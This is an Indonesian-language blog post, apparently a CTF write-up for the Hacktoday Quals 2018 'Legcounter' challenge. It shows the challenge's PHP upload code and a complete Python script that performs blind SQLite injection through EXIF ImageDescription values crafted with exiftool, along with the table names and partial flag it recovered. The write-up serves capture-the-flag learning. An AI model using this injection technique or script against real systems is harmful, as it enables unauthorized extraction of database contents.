<!DOCTYPE html>
<html>
<!--
====================================================
       _         _ _ _       _            ___ 
      | |       | (_) |     | |          / __)
  ____| | _   _ | |_| | ____| | _   ____| |__ 
 / _  | || \ / || | | |/ _  | || \ / ___)  __)
( ( | | |_) | (_| | | ( ( | | | | | |   | |   
 \_||_|____/ \____|_|_|\_||_|_| |_|_|   |_|  
 
====================================================
@ABDILAHRF
====================================================
-->
<head>
<meta charset="utf-8">
<title>HACKTODAY QUALS 2018 - LEGCOUNTER &vert; @ABDILAHRF</title>
<meta name="description" content="Hacktoday Quals 2018 - Legcounter">
<meta name="keywords" content="hacktoday">

<!-- Twitter Cards -->
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://localhost:4000/images/logo.png">
<meta name="twitter:title" content="Hacktoday Quals 2018 - Legcounter">
<meta name="twitter:description" content="Hacktoday Quals 2018 - Legcounter">
<meta name="twitter:creator" content="@abdilahrf">

<!-- Open Graph -->
<meta property="og:locale" content="en_US">
<meta property="og:type" content="article">
<meta property="og:title" content="Hacktoday Quals 2018 - Legcounter">
<meta property="og:description" content="Hacktoday Quals 2018 - Legcounter">
<meta property="og:url" content="http://localhost:4000/ctf/writeup-legcount-hacktoday-Copy">
<meta property="og:site_name" content="@abdilahrf">
<meta property="og:image" content="https://avatars2.githubusercontent.com/u/6015012?v=3&s=460">





<link rel="canonical" href="http://localhost:4000/ctf/writeup-legcount-hacktoday-Copy">
<link href="http://localhost:4000/feed.xml" type="application/atom+xml" rel="alternate" title="@abdilahrf Feed">
<link rel="author" href="https://plus.google.com/?rel=author">

<!-- http://t.co/dKP3o1e -->
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />


    <link href='http://fonts.googleapis.com/css?family=Montserrat:400,700|Open+Sans:400,600,300,800,700' rel='stylesheet' type='text/css'>
	<link rel="stylesheet" href="http://localhost:4000/assets/css/vendor/font-awesome.min.css">
    <link rel="stylesheet" href="http://localhost:4000/assets/css/vendor/normalize.css">
    <link rel="stylesheet" href="http://localhost:4000/assets/css/vendor/nprogress.css">
    <link rel="stylesheet" href="http://localhost:4000/assets/css/vendor/foundation.min.css">
    <link rel="stylesheet" href="http://localhost:4000/assets/css/style.css">
    <link rel="stylesheet" href="http://localhost:4000/assets/css/post.css">
    <link rel="stylesheet" href="http://localhost:4000/assets/css/code/monokai.css">





<!-- Icons -->
<!-- 16x16 -->
<link rel="shortcut icon" href="http://localhost:4000/favicon.ico">
<!-- 32x32 -->
<link rel="shortcut icon" href="http://localhost:4000/favicon.png">
<!-- 57x57 (precomposed) for iPhone 3GS, pre-2011 iPod Touch and older Android devices -->
<link rel="apple-touch-icon-precomposed" href="http://localhost:4000/images/apple-touch-icon-precomposed.png">
<!-- 72x72 (precomposed) for 1st generation iPad, iPad 2 and iPad mini -->
<link rel="apple-touch-icon-precomposed" sizes="72x72" href="http://localhost:4000/images/apple-touch-icon-72x72-precomposed.png">
<!-- 114x114 (precomposed) for iPhone 4, 4S, 5 and post-2011 iPod Touch -->
<link rel="apple-touch-icon-precomposed" sizes="114x114" href="http://localhost:4000/images/apple-touch-icon-114x114-precomposed.png">
<!-- 144x144 (precomposed) for iPad 3rd and 4th generation -->
<link rel="apple-touch-icon-precomposed" sizes="144x144" href="http://localhost:4000/images/apple-touch-icon-144x144-precomposed.png">

<style type="text/css">@media only screen and (min-width:43.75em){.notepad-post-content div>p:first-child:first-letter{float:left;font-size:4.688rem;line-height:4.375rem;padding-top:.25rem;padding-right:.5rem;padding-left:.188rem;font-family:serif}}</style>
</head>
<body class="post-template" itemscope itemtype="http://schema.org/WebPage">  

        <main id="notepad-post-container-simple" class="notepad-post-container-simple" role="main">
            <header class="notepad-post-header-simple">
                <div class="notepad-post-menu-header-simple">

                    <a class="notepad-blog-logo" href="http://localhost:4000">
                        <img src="http://localhost:4000/images/logo.png" alt="Blog Logo" />
                    </a>

                <div class="notepad-blog-menu">      
    <div class="notepad-mobile-menu show-for-small">
        <a href="#"><i class="fa fa-bars"></i></a>
    </div>
    <ul class="notepad-menu">
        <li class="notepad-mobile-close-btn show-for-small text-right">
            <a href="#"><i class="fa fa-times"></i></a>
        </li>

            <li>
                    <a href="http://localhost:4000/">Home</a>
                 </li>

            <li>
                    <a href="http://localhost:4000/featured">Featured Posts</a>
                 </li>

            <li>
                    <a href="http://localhost:4000/categories">Categories</a>
                 </li>

            <li>
                    <a href="http://localhost:4000/about">About</a>
                 </li>
            
           <li><a href="http://localhost:4000/feed.xml" title="Atom/RSS feed"><i class="icon-rss"></i> Feed</a></li>
    </ul>

</div>
            </div>

                <div class="notepad-post-title-simple row">
                    <div class="small-12 columns">
                        <div class="notepad-post-meta-simple">
                            <h1>Hacktoday Quals 2018 - Legcounter</h1>
                            <p>by <strong>Abdillah Muhamad</strong> &#8212; on <a href="http://localhost:4000/tags/index.html#hacktoday" data-toggle="tooltip" title="Posts tagged with hacktoday" rel="tag">hacktoday</a> <strong><time datetime="2018-08-05T00:00:00+07:00">05 Aug 2018</time></strong></p>
                        </div>
                    </div>
                </div>
            </header>

        <article class="notepad-post-content post tag-simple">
            <div><h3 id="soal">Soal</h3>
<hr />

<p>http://103.56.207.107:50001</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="cp">&lt;?php</span>
<span class="k">include</span> <span class="p">(</span><span class="s1">'init.php'</span><span class="p">);</span>

<span class="nb">session_start</span><span class="p">();</span>
<span class="nv">$upload_dir</span> <span class="o">=</span> <span class="s2">"uploads/"</span><span class="p">;</span>
<span class="nv">$upload_check</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="nv">$imageFileType</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nb">pathinfo</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"legpic"</span><span class="p">][</span><span class="s2">"name"</span><span class="p">],</span> <span class="nx">PATHINFO_EXTENSION</span><span class="p">));</span>
<span class="nv">$file_</span> <span class="o">=</span> <span class="nv">$upload_dir</span> <span class="o">.</span> <span class="nb">md5</span><span class="p">(</span><span class="nb">random_bytes</span><span class="p">(</span><span class="mi">32</span><span class="p">))</span> <span class="o">.</span> <span class="s1">'.'</span> <span class="o">.</span> <span class="nv">$imageFileType</span><span class="p">;</span>

<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"submit"</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'token'</span><span class="p">]))</span> <span class="p">{</span>
	<span class="nv">$check</span> <span class="o">=</span> <span class="nb">getimagesize</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"legpic"</span><span class="p">][</span><span class="s2">"tmp_name"</span><span class="p">]);</span>
	<span class="k">if</span> <span class="p">(</span><span class="nv">$check</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
		<span class="nv">$upload_check</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">else</span> <span class="p">{</span>
		<span class="nv">$upload_check</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="nv">$t</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'token'</span><span class="p">];</span>
	<span class="k">if</span> <span class="p">(</span><span class="nv">$t</span> <span class="o">!=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'csrf_token'</span><span class="p">])</span> <span class="p">{</span>
		<span class="k">die</span><span class="p">(</span><span class="s2">"Token tidak valid!"</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'csrf_token'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">openssl_random_pseudo_bytes</span><span class="p">(</span><span class="mi">32</span><span class="p">));</span>
    
    <span class="k">if</span> <span class="p">(</span><span class="nv">$imageFileType</span> <span class="o">!=</span> <span class="s2">"jpg"</span> <span class="o">&amp;&amp;</span> <span class="nv">$imageFileType</span> <span class="o">!=</span> <span class="s2">"png"</span> <span class="o">&amp;&amp;</span> <span class="nv">$imageFileType</span> <span class="o">!=</span> <span class="s2">"jpeg"</span> <span class="o">&amp;&amp;</span> <span class="nv">$imageFileType</span> <span class="o">!=</span> <span class="s2">"gif"</span><span class="p">)</span> <span class="p">{</span>
		<span class="nv">$upload_check</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="k">if</span> <span class="p">(</span><span class="nv">$upload_check</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span> <span class="o">!</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"legpic"</span><span class="p">][</span><span class="s2">"tmp_name"</span><span class="p">],</span> <span class="nv">$file_</span><span class="p">))</span> <span class="p">{</span>
		<span class="k">die</span><span class="p">(</span><span class="s2">"gagal upload :("</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="nv">$exif</span> <span class="o">=</span> <span class="nb">exif_read_data</span><span class="p">(</span><span class="nv">$file_</span><span class="p">);</span>
	<span class="nb">parse_str</span><span class="p">(</span><span class="nv">$exif</span><span class="p">[</span><span class="s1">'ImageDescription'</span><span class="p">],</span> <span class="nv">$exif</span><span class="p">);</span>
	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$exif</span><span class="p">)</span> <span class="k">die</span><span class="p">(</span><span class="s2">"Gambar tidak valid!"</span><span class="p">);</span>
	<span class="nv">$leg</span> <span class="o">=</span> <span class="nx">SQLite3</span><span class="o">::</span><span class="na">escapeString</span><span class="p">(</span><span class="nv">$exif</span><span class="p">[</span><span class="s1">'leg'</span><span class="p">]);</span>
    
    <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">exec</span><span class="p">(</span><span class="s2">"DELETE FROM Legs Where Session='</span><span class="si">{</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'session_token'</span><span class="p">]</span><span class="si">}</span><span class="s2">';"</span><span class="p">);</span>
	<span class="nx">query</span><span class="p">(</span><span class="s2">"INSERT INTO Legs (Session, Leg) VALUES ('</span><span class="si">{</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'session_token'</span><span class="p">]</span><span class="si">}</span><span class="s2">', </span><span class="si">{</span><span class="nv">$leg</span><span class="si">}</span><span class="s2">)"</span><span class="p">);</span>
	<span class="nb">unlink</span><span class="p">(</span><span class="nv">$file_</span><span class="p">);</span>
    
    <span class="nv">$dir</span> <span class="o">=</span> <span class="s2">"results/"</span><span class="p">;</span>
	<span class="nv">$fname</span> <span class="o">=</span> <span class="nv">$dir</span> <span class="o">.</span> <span class="nb">sha1</span><span class="p">(</span><span class="nb">openssl_random_pseudo_bytes</span><span class="p">(</span><span class="mi">32</span><span class="p">))</span> <span class="o">.</span> <span class="s1">'.php'</span><span class="p">;</span>
	<span class="nv">$f</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$fname</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">);</span>
    
    <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">"SELECT Leg FROM Legs Where Session='</span><span class="si">{</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'session_token'</span><span class="p">]</span><span class="si">}</span><span class="s2">' Limit 1"</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$result</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">foreach</span><span class="p">(</span><span class="nv">$result</span> <span class="k">as</span> <span class="nv">$res</span><span class="p">)</span> <span class="p">{</span>
			<span class="k">if</span> <span class="p">(</span><span class="nv">$res</span><span class="p">[</span><span class="s1">'Leg'</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'1'</span><span class="p">)</span> <span class="p">{</span>
				<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span> <span class="s1">'Satu kaki'</span><span class="p">);</span>
			<span class="p">}</span>
			<span class="k">else</span>
			<span class="k">if</span> <span class="p">(</span><span class="nv">$res</span><span class="p">[</span><span class="s1">'Leg'</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'2'</span><span class="p">)</span> <span class="p">{</span>
				<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span> <span class="s1">'Dua kaki'</span><span class="p">);</span>
			<span class="p">}</span>
			<span class="k">else</span> <span class="p">{</span>
				<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span> <span class="s1">'Tidak diketahui'</span><span class="p">);</span>
			<span class="p">}</span>
		<span class="p">}</span>
	<span class="p">}</span>

	<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span> <span class="s2">"&lt;?php unlink(__FILE__); ?&gt;"</span><span class="p">);</span>
	<span class="nb">fclose</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
	<span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /</span><span class="si">{</span><span class="nv">$fname</span><span class="si">}</span><span class="s2">"</span><span class="p">);</span>
	<span class="nv">$db</span> <span class="o">=</span> <span class="k">NULL</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">die</span><span class="p">();</span>
<span class="cp">?&gt;</span>

</code></pre></div></div>

<h3 id="writeup">Writeup</h3>
<hr />
<p>Diberikan website yang mempunya fitur untuk upload gambar dan membaca data melalui value dari exif ImageDescription, Jadi gambar yang kita upload akan di proses datanya ketika memiliki value pada “ImageDescription” dan value yang ada di dalamnya akan di passing ke fungsi <code class="highlighter-rouge">parse_str</code>.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
	<span class="nb">parse_str</span><span class="p">(</span><span class="nv">$exif</span><span class="p">[</span><span class="s1">'ImageDescription'</span><span class="p">],</span> <span class="nv">$exif</span><span class="p">);</span>
	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$exif</span><span class="p">)</span> <span class="k">die</span><span class="p">(</span><span class="s2">"Gambar tidak valid!"</span><span class="p">);</span>

</code></pre></div></div>

<p>untuk menambahkan ImageDescription pada gambar kita bisa menggunakan exiftool <code class="highlighter-rouge">exiftool -ImageDescription="leg=1" gambar.jpg</code> sehingga ketika di upload akan mengembalikan response <code class="highlighter-rouge">Satu kaki</code></p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="nx">query</span><span class="p">(</span><span class="s2">"INSERT INTO Legs (Session, Leg) VALUES ('</span><span class="si">{</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'session_token'</span><span class="p">]</span><span class="si">}</span><span class="s2">', </span><span class="si">{</span><span class="nv">$leg</span><span class="si">}</span><span class="s2">)"</span><span class="p">);</span>

</code></pre></div></div>

<p>pada kode di atas terlihat bahwa input yang kita masukkan dilempar kedalam query, sehingga kita dapat melakukan injeksi, namun terlihat ada filter yang di gunakan untuk mengescape inputan kita menggunakan <code class="highlighter-rouge">$leg = SQLite3::escapeString($exif['leg']);</code> namun karena input kita tidak di wrap dengan quote di bagian query nya seperti <code class="highlighter-rouge">'{$leg}'</code> jadi kita dapat melakukan injeksi tanpa menggunakan quote atau double, kemudian kita bisa mengkonstruksikan payload untuk melakukan blind sqlite injection.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">re</span>
<span class="kn">from</span> <span class="nn">StringIO</span> <span class="kn">import</span> <span class="n">StringIO</span>
<span class="kn">from</span> <span class="nn">pycurl</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">pickle</span>

<span class="n">url</span> <span class="o">=</span> <span class="s">"http://103.56.207.107:50001/upload.php"</span>

<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
<span class="s">"Cache-Control"</span><span class="p">:</span> <span class="s">"max-age=0"</span><span class="p">,</span> 
<span class="s">"Origin"</span><span class="p">:</span> <span class="s">"http://103.56.207.107:50001"</span><span class="p">,</span> 
<span class="s">"Upgrade-Insecure-Requests"</span><span class="p">:</span> <span class="s">"1"</span><span class="p">,</span> 
<span class="s">"Content-Type"</span><span class="p">:</span> <span class="s">"multipart/form-data"</span><span class="p">,</span> 
<span class="s">"User-Agent"</span><span class="p">:</span> <span class="s">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.75 Safari/537.36"</span><span class="p">,</span>
<span class="s">"Accept"</span><span class="p">:</span> <span class="s">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"</span><span class="p">,</span> 
<span class="s">"Referer"</span><span class="p">:</span> <span class="s">"http://103.56.207.107:50001/"</span><span class="p">,</span> 
<span class="s">"Accept-Language"</span><span class="p">:</span> <span class="s">"en-US,en;q=0.9,de;q=0.8,es;q=0.7,id;q=0.6,ms;q=0.5"</span><span class="p">,</span> 
<span class="s">"Connection"</span><span class="p">:</span> <span class="s">"close"</span><span class="p">,</span>
<span class="s">"Cookie"</span><span class="p">:</span> <span class="s">"PHPSESSID=5d42tgrbtj0lifr04f02k3r1e6"</span>
<span class="p">}</span>


<span class="k">def</span> <span class="nf">check</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
	<span class="k">return</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">"Satu kaki"</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">getToken</span><span class="p">():</span>
    <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
    <span class="n">greptoken</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">"http://103.56.207.107:50001/"</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
    <span class="n">token</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">r"type=\"hidden\" value=\"(.*)\""</span><span class="p">,</span> <span class="n">greptoken</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">"</span><span class="se">\"</span><span class="s">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">token</span>

<span class="k">def</span> <span class="nf">upload</span><span class="p">(</span><span class="n">token</span><span class="p">):</span>
    <span class="n">c</span> <span class="o">=</span> <span class="n">Curl</span><span class="p">()</span>
    <span class="n">d</span> <span class="o">=</span> <span class="n">StringIO</span><span class="p">()</span>
    <span class="n">h</span> <span class="o">=</span> <span class="n">StringIO</span><span class="p">()</span>
    <span class="n">c</span><span class="o">.</span><span class="n">setopt</span><span class="p">(</span><span class="n">URL</span><span class="p">,</span> <span class="n">url</span><span class="p">)</span>
    <span class="n">c</span><span class="o">.</span><span class="n">setopt</span><span class="p">(</span><span class="n">POST</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
    <span class="n">c</span><span class="o">.</span><span class="n">setopt</span><span class="p">(</span><span class="n">HTTPPOST</span><span class="p">,</span> <span class="p">[(</span><span class="s">'legpic'</span><span class="p">,</span> <span class="p">(</span><span class="n">FORM_FILE</span><span class="p">,</span> <span class="s">'1leg.jpg'</span><span class="p">)),</span> <span class="p">(</span><span class="s">'submit'</span><span class="p">,</span> <span class="s">'Deteksi'</span><span class="p">),</span> <span class="p">(</span><span class="s">'token'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">token</span><span class="p">))])</span>
    <span class="n">c</span><span class="o">.</span><span class="n">setopt</span><span class="p">(</span><span class="n">COOKIEFILE</span><span class="p">,</span> <span class="s">'cookie.txt'</span><span class="p">)</span>
    <span class="n">c</span><span class="o">.</span><span class="n">setopt</span><span class="p">(</span><span class="n">COOKIEJAR</span><span class="p">,</span> <span class="s">'cookie.txt'</span><span class="p">)</span>
    <span class="n">c</span><span class="o">.</span><span class="n">setopt</span><span class="p">(</span><span class="n">FOLLOWLOCATION</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
    <span class="n">c</span><span class="o">.</span><span class="n">setopt</span><span class="p">(</span><span class="n">WRITEFUNCTION</span><span class="p">,</span> <span class="n">d</span><span class="o">.</span><span class="n">write</span><span class="p">)</span>
    <span class="n">c</span><span class="o">.</span><span class="n">setopt</span><span class="p">(</span><span class="n">HEADERFUNCTION</span><span class="p">,</span> <span class="n">h</span><span class="o">.</span><span class="n">write</span><span class="p">)</span>
    <span class="n">c</span><span class="o">.</span><span class="n">perform</span><span class="p">()</span>
    <span class="n">c</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">d</span><span class="o">.</span><span class="n">getvalue</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">blind</span><span class="p">(</span><span class="n">kolom</span><span class="p">,</span><span class="n">table</span><span class="p">):</span>
    <span class="n">passwd</span> <span class="o">=</span> <span class="s">""</span>
    <span class="n">idx</span> <span class="o">=</span> <span class="mi">1</span>

    <span class="k">while</span> <span class="p">(</span><span class="bp">True</span><span class="p">):</span>
        <span class="n">lo</span> <span class="o">=</span> <span class="mi">1</span>
        <span class="n">hi</span> <span class="o">=</span> <span class="mi">255</span>
        <span class="n">temp</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
        <span class="k">while</span><span class="p">(</span><span class="n">lo</span> <span class="o">&lt;=</span> <span class="n">hi</span><span class="p">):</span>
            <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">lo</span> <span class="o">+</span> <span class="n">hi</span><span class="p">)</span> <span class="o">/</span> <span class="mi">2</span>
            <span class="c"># command = "exiftool -ImageDescription=\"leg=(SELECT CASE when hex(substr({},{},1)) &lt;= hex(char({})) THEN 1 ELSE 2 END FROM {})\" 1leg.jpg".format(str(kolom),str(idx),str(mid),str(table))</span>
            <span class="n">command</span> <span class="o">=</span> <span class="s">"exiftool -ImageDescription=</span><span class="se">\"</span><span class="s">leg=(SELECT CASE when hex(substr({},{},1)) &lt;= hex(char({})) THEN 1 ELSE 2 END FROM {}))--+-</span><span class="se">\"</span><span class="s"> 1leg.jpg"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">kolom</span><span class="p">),</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">),</span><span class="nb">str</span><span class="p">(</span><span class="n">mid</span><span class="p">),</span><span class="nb">str</span><span class="p">(</span><span class="n">table</span><span class="p">))</span>
            <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
            <span class="n">res</span> <span class="o">=</span> <span class="n">upload</span><span class="p">(</span><span class="n">getToken</span><span class="p">())</span>

            <span class="k">if</span> <span class="n">check</span><span class="p">(</span><span class="n">res</span><span class="p">):</span>
               <span class="n">hi</span> <span class="o">=</span> <span class="n">mid</span><span class="o">-</span><span class="mi">1</span>
               <span class="n">temp</span> <span class="o">=</span> <span class="n">mid</span>
            <span class="k">else</span><span class="p">:</span>
               <span class="n">lo</span> <span class="o">=</span> <span class="n">mid</span><span class="o">+</span><span class="mi">1</span>
               
        <span class="k">if</span> <span class="p">(</span><span class="n">hi</span> <span class="o">==</span> <span class="mi">0</span><span class="p">):</span> <span class="k">break</span>
        <span class="n">passwd</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">temp</span><span class="p">)</span>
        <span class="k">print</span> <span class="s">"Result [{}]: {}"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">table</span><span class="p">,</span><span class="n">passwd</span><span class="p">)</span>
        <span class="n">idx</span> <span class="o">+=</span> <span class="mi">1</span>

    <span class="k">return</span> <span class="n">passwd</span>
   



<span class="c"># blind("sql","sqlite_master")</span>
<span class="c"># CREATE TABLE Legs (Id INTEGER PRIMARY KEY, Session TEXT UNIQUE, Leg INTEGER)</span>

<span class="c"># blind("name","sqlite_master where name!=char(76,101,103,115) and sql like(char(37,102,108,97,103,37))")</span>
<span class="c"># mysecretflaag</span>

<span class="c"># blind("sql","sqlite_master where name=char(109,121,115,101,99,114,101,116,102,108,97,97,103)")</span>
<span class="c"># CREATE TABLE mysecretflaag (Id INTEGER PRIMARY KEY, thi</span>

<span class="n">blind</span><span class="p">(</span><span class="s">"this_is_real_flag"</span><span class="p">,</span><span class="s">"mysecretflaag"</span><span class="p">)</span>
<span class="c">#HackToday{blind_sqlite3_injection_via_exif_</span>

</code></pre></div></div>

<p><img src="../images/legcounter.PNG" alt="Error" /></p>
</div>
        </article>
        <div class="cf"></div>
        <div class="row text-center">
            <section class="notepad-post-share">
                <a class="twitter-icon" href="https://twitter.com/intent/tweet?text=&quot;Hacktoday Quals 2018 - Legcounter&quot;%20http://localhost:4000/ctf/writeup-legcount-hacktoday-Copy%20via%20&#64;abdilahrf"
                    onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;" title="Share on Twitter">
                    <i class="fa fa-twitter"></i>
                </a>
                <a class="facebook-icon" href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/ctf/writeup-legcount-hacktoday-Copy"
                    onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;" title="Share on Facebook">
                    <i class="fa fa-facebook"></i>
                </a>
                <a class="google-icon" href="https://plus.google.com/share?url=http://localhost:4000/ctf/writeup-legcount-hacktoday-Copy"
                   onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;" title="Share on Google+">
                    <i class="fa fa-google-plus"></i>
                </a>
            </section>
        </div>
        <div class="cf"></div>
        
            <div class="notepad-author-info">
                <div class="row">
                    <section class="notepad-post-author small-12 columns">
                        
                            <img src="https://avatars2.githubusercontent.com/u/6015012?v=3&s=460" class="notepad-post-author-avatar" alt="Abdillah Muhamad's photo">
                        
                        
                            <span class="author-label">Author</span>
                            <h1>Abdillah Muhamad</h1>
                        
                        
                            <p><a href="mailto:hasny1337@gmail.com" class="author-website">hasny1337@gmail.com</a></p>
                        
                        
                            <p>Coffe make you like a hero</p>
                        
                    </section>
                </div>
            </div>
 
        
        <div class="cf"></div>
        
        <section class="notepad-disqus row">
    <div class="small-12 columns">
        <h1 class="notepad-comments-header">Comments</h1>
        <div id="disqus_thread"></div>
        <script type="text/javascript">
    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
    var disqus_shortname = 'abdilahrf'; // required: replace example with your forum shortname

    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();

    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function () {
        var s = document.createElement('script'); s.async = true;
        s.type = 'text/javascript';
        s.src = '//' + disqus_shortname + '.disqus.com/count.js';
        (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
    }());
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
    </div>
</section>

        <div class="cf"></div>

    <footer class="notepad-site-footer">
    <div class="copyright">
         <section>All content copyright <a href="http://localhost:4000/about">Abdillah Muhamad</a> &copy; 2018 &bull; All rights reserved.</section>
         <section>Proudly published with <a class="icon-ghost" href="https://jekyllrb.com/">Jekyll</a></section>
    </div>
    <div class="social-icons">
        
        
        <a href="http://twitter.com/abdilahrf">
            <span class="fa-stack fa-lg">
                <i class="fa fa-circle fa-stack-2x fa-inverse"></i>
                <i class="fa fa-twitter fa-stack-1x"></i>
            </span>
        </a>
        
        
        <a href="https://plus.google.com/">
            <span class="fa-stack fa-lg">
                <i class="fa fa-circle fa-stack-2x fa-inverse"></i>
                <i class="fa fa-google-plus fa-stack-1x"></i>
            </span>
        </a>
        
        
        
        <a href="http://github.com/abdilahrf">
            <span class="fa-stack fa-lg">
                <i class="fa fa-circle fa-stack-2x fa-inverse"></i>
                <i class="fa fa-github fa-stack-1x"></i>
            </span>
        </a>
        
        
        <a href="http://facebook.com/abdilah.jk">
            <span class="fa-stack fa-lg">
                <i class="fa fa-circle fa-stack-2x fa-inverse"></i>
                <i class="fa fa-facebook fa-stack-1x"></i>
            </span>
        </a>
        
    </div>
    
    <div class="cf"></div>
</footer> 
</main>    
    <script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
    <script>window.jQuery || document.write('<script src="http://localhost:4000/assets/js/vendor/jquery-1.11.1.min.js"><\/script>')</script>
    <script src="http://localhost:4000/assets/js/vendor/modernizr.js"></script>
    <script src="http://localhost:4000/assets/js/foundation.min.js"></script>
    
    <script src="http://localhost:4000/assets/js/notepad.js"></script>
